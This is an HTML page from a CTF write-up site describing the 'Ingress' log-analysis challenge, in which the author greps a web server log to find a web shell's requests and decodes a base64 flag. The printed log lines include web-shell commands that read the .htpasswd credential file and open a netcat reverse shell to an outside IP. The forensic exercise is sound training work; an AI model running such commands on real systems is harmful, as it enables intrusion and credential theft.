@@ -1,0 +1,220 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Ingress - CTF Writeups</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../Introduction.html">Introduction</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/index.html"><strong aria-hidden="true">1.</strong> PBjar CTF 2021</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.1.</strong> Cryptography</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/crypto/Convert/Convert.html"><strong aria-hidden="true">1.1.1.</strong> Convert</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/crypto/ReallynotSecureAlgorithm/ReallynotSecureAlgorithm.html"><strong aria-hidden="true">1.1.2.</strong> ReallynotSecureAlgorithm</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.2.</strong> Miscellaneous</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/discordplz/discordplz.html"><strong aria-hidden="true">1.2.1.</strong> discord plz</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/miner/miner.html"><strong aria-hidden="true">1.2.2.</strong> miner</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/TechLead/TechLead.html"><strong aria-hidden="true">1.2.3.</strong> TechLead</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/readFlag1/readFlag1.html"><strong aria-hidden="true">1.2.4.</strong> readFlag1</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/readFlag2/readFlag2.html"><strong aria-hidden="true">1.2.5.</strong> readFlag2</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/readFlag3/readFlag3.html"><strong aria-hidden="true">1.2.6.</strong> readFlag3</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/MEV/MEV.html"><strong aria-hidden="true">1.2.7.</strong> MEV</a></li><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/misc/Owner/Owner.html"><strong aria-hidden="true">1.2.8.</strong> Owner</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.3.</strong> Forensics</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../PBJar-CTF-2021-Write-up/forensics/ArtMystery/ArtMystery.html"><strong aria-hidden="true">1.3.1.</strong> Art Mystery</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/index.html"><strong aria-hidden="true">2.</strong> DeconstruCT.F 2021</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">2.1.</strong> Cryptography</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Cryptography/RSA-1/RSA-1.html"><strong aria-hidden="true">2.1.1.</strong> RSA-1</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Cryptography/RSA-2/RSA-2.html"><strong aria-hidden="true">2.1.2.</strong> RSA-2</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Cryptography/RSA-3/RSA-3.html"><strong aria-hidden="true">2.1.3.</strong> RSA-3</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Cryptography/CodeDecode/CodeDecode.html"><strong aria-hidden="true">2.1.4.</strong> Code Decode</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.2.</strong> OSINT</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/OSINT/ExtendReality/ExtendReality.html"><strong aria-hidden="true">2.2.1.</strong> Extend Reality</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Web</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Web/Here's-a-flag/Here'saflag.html"><strong aria-hidden="true">2.3.1.</strong> Here's a flag</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Web/Please/Please.html"><strong aria-hidden="true">2.3.2.</strong> Please</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> Forensics</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Forensics/Pirates/Pirates.html"><strong aria-hidden="true">2.4.1.</strong> Pirates</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Forensics/TegRads/TegRads.html"><strong aria-hidden="true">2.4.2.</strong> Teg Rads</a></li><li class="chapter-item expanded "><a href="../../../DeconstruCT.F/Forensics/The-Missing-Journalist/TheMissingJournalist.html"><strong aria-hidden="true">2.4.3.</strong> The Missing Journalist</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/index.html"><strong aria-hidden="true">3.</strong> Digital Overdose 2021 Autumn CTF</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">3.1.</strong> Hash Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash1/hash1.html"><strong aria-hidden="true">3.1.1.</strong> Hash 1</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash2/hash2.html"><strong aria-hidden="true">3.1.2.</strong> Hash 2</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash3/hash3.html"><strong aria-hidden="true">3.1.3.</strong> Hash 3</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash4/hash4.html"><strong aria-hidden="true">3.1.4.</strong> Hash 4</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash5/hash5.html"><strong aria-hidden="true">3.1.5.</strong> Hash 5</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash6/hash6.html"><strong aria-hidden="true">3.1.6.</strong> Hash 6</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Hash Cracking/Hash7/hash7.html"><strong aria-hidden="true">3.1.7.</strong> Hash 7</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> Source Analysis</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Source Analysis/A1 - C-naningans/C-nanigans.html"><strong aria-hidden="true">3.2.1.</strong> C-Nanigans</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Reversing</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Reversing/Dyns, Syms, and Tabs/DynsSymsandTabs.html"><strong aria-hidden="true">3.3.1.</strong> Dyns, Syms, and Tabs</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Miscellaneous</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Misc/Degrees/Degrees.html"><strong aria-hidden="true">3.4.1.</strong> Degrees</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Steganography</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/A cornucopia of numbers/A cornucopia of numbers.html"><strong aria-hidden="true">3.5.1.</strong> A cornucopia of numbers</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/Queen's gambit/Queen's gambit.html"><strong aria-hidden="true">3.5.2.</strong> Queen's gambit</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/The Detective/The Detective.html"><strong aria-hidden="true">3.5.3.</strong> The Detective</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/Not exactly Nestene's Autons/Not exactly Nestene's Autons.html"><strong aria-hidden="true">3.5.4.</strong> Not exactly Nestene's Autons</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/Phreak File/Phreak File.html"><strong aria-hidden="true">3.5.5.</strong> Phreak File</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Steganography/Donald's youth/Donald's youth.html"><strong aria-hidden="true">3.5.6.</strong> Donald's youth</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.6.</strong> Cryptography</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Cryptography/Constant Primes/Constant Primes.html"><strong aria-hidden="true">3.6.1.</strong> Constant Primes</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Cryptography/Carousel/Carousel.html"><strong aria-hidden="true">3.6.2.</strong> Carousel</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Cryptography/Simply Cipher/Simply Cipher.html"><strong aria-hidden="true">3.6.3.</strong> Simply Cipher</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.7.</strong> Log Analysis</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Log Analysis/Ingress/Ingress.html" class="active"><strong aria-hidden="true">3.7.1.</strong> Ingress</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Log Analysis/Investigation/Investigation.html"><strong aria-hidden="true">3.7.2.</strong> Investigation</a></li><li class="chapter-item expanded "><a href="../../../DOA2021ctf/Log Analysis/Backup Policy/Backup Policy.html"><strong aria-hidden="true">3.7.3.</strong> Backup Policy</a></li></ol></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">CTF Writeups</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="problem-statement"><a class="header" href="#problem-statement">Problem Statement:</a></h1>
+<p><img src="https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/Log%20Analysis/Ingress/ques.png" alt="question" /></p>
+<h2 id="solution"><a class="header" href="#solution">Solution:</a></h2>
+<p>This challenge came along with <code>attack.7z</code> file which when extracted gave me <code>attack.log</code>.</p>
+<p>I tried using <code>grep</code> with a bunch of words including but not limited to <code>DO{</code>, <code>flag</code> etc. before trying <code>pass</code></p>
+<pre><code>strings attack.log| grep -i 'pass' 
+2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
+</code></pre>
+<p>This looked suspicious to me so I found the line number of the above log incident.</p>
+<pre><code>$ strings attack.log| grep  -n 'pass' 
+37628:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
+</code></pre>
+<p>We can see that the line number is 37628. So I tried to output 10 lines above and below 37628</p>
+<pre><code>$ strings attack.log| grep  -n -i 'pass' -b10 -a10 
+37618-9504190-2021-09-06 20:45:36 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
+37619-9504538-2021-09-06 20:45:36 135.233.142.30 GET dovercon/sponsoring-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
+37620-9504883-2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
+37621-9505087-2021-09-06 20:45:47 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 27
+37622-9505464-2021-09-06 20:45:47 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 29
+37623-9505811-2021-09-06 20:45:47 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 21
+37624-9506158-2021-09-06 20:45:47 135.233.142.30 GET ctf/about - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 20
+37625-9506482-2021-09-06 20:45:59 135.233.142.30 GET assets/images/ctf/2021-autumn/ractf_logo.svg - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 20
+37626-9506818-2021-09-06 20:45:59 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 26
+37627-9507142-2021-09-06 20:45:59 135.233.142.30 GET dovercon/speakers-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 21
+37628:9507464:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
+37629-9507681-2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
+37630-9507918-2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
+37631-9508143-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 22
+37632-9508333-2021-09-06 20:48:00 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 21
+37633-9508493-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/l/email-protection - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 28
+37634-9508647-2021-09-06 20:48:00 135.233.142.30 GET privacy - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 25
+37635-9508782-2021-09-06 20:48:00 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 25
+37636-9509024-2021-09-06 20:48:00 135.233.142.30 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 22
+37637-9509274-2021-09-06 20:48:00 135.233.142.30 GET dovercon/2021/mentors - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 29
+37638-9509505-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 54.192.35.96 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.138+Safari/537.36 - 200 0 0 20
+</code></pre>
+<p>I saw that line 37629 had some base64 encoded text. Deciphring this I retrived the flag</p>
+<pre><code>DO{better_remove_that_backdoor}
+</code></pre>
+<h3 id="notes"><a class="header" href="#notes">Notes:</a></h3>
+<h3 id="reference"><a class="header" href="#reference">Reference:</a></h3>
+<p>https://www.joeldare.com/wiki/linux:grep_a_range_of_lines</p>
+<h3 id="tags"><a class="header" href="#tags">Tags:</a></h3>
+<p><code>Log</code> <code>Analysis</code> </p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../DOA2021ctf/Cryptography/Simply Cipher/Simply Cipher.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../DOA2021ctf/Log Analysis/Investigation/Investigation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../DOA2021ctf/Cryptography/Simply Cipher/Simply Cipher.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../DOA2021ctf/Log Analysis/Investigation/Investigation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
